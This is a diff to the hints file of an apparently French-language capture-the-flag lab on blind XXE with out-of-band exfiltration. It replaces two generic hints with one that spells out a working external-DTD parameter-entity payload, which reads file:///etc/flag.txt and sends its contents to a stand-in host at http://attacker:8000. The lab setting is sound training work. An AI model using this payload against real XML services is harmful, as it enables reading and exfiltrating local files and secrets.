@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
-    "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter blind-xxe-oob."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
-    "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "title": "Entités de paramètres",
+    "cost": 20,
+    "content": "Dans ta DTD externe : <!ENTITY % file SYSTEM \"file:///etc/flag.txt\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker:8000/?d=%file;'>\">%eval;%exfil;"
   }
 ]
